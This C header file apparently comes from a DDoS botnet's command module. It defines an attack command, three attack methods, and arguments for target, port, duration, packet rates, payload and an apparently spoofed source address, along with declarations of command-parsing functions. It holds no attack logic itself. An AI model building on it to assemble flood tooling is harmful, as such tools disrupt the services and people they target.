#pragma once

#include <stdint.h>

#define CMD_ATTACK      1

#define METHOD_COUNT    3
#define ARGUMENT_COUNT  14

#define TYPE_CHAR       1
#define TYPE_UINT16T    2

#define ARG_LEN         1
#define ARG_SCRIP       2
#define ARG_PAYLOAD     3
#define ARG_METHOD      4
#define ARG_DURATION    5
#define ARG_TARGET      6
#define ARG_REPEAT      7
#define ARG_MINPPS      8
#define ARG_MAXPPS      9
#define ARG_MINLEN      10
#define ARG_MAXLEN      11
#define ARG_PORT        12
#define ARG_RAND        13

struct arguments {
    char *name;
    uint16_t arg_id;
    uint16_t data_type;
    uint16_t data_len;
    char desc[256];
} cmdargument[ARGUMENT_COUNT];

struct attacks {
    char *name;
    uint16_t id;
    uint16_t retid;
} methods[METHOD_COUNT];

struct arg {
    uint16_t arg_id;
    uint16_t data_type;
    uint16_t data_len;
    char *ctype;
    uint16_t u16type;
};

struct command {
    uint16_t bit_shift;
    uint16_t command_id;
    uint16_t args_len;
    uint16_t attack_id;
};

void command_enc_switch(struct command *);
int command_argument_parse(char *, int);
void command_zero(struct command *);
int command_parse(char *, char *);
void command_attacks_init(void);
void command_args_init(void);
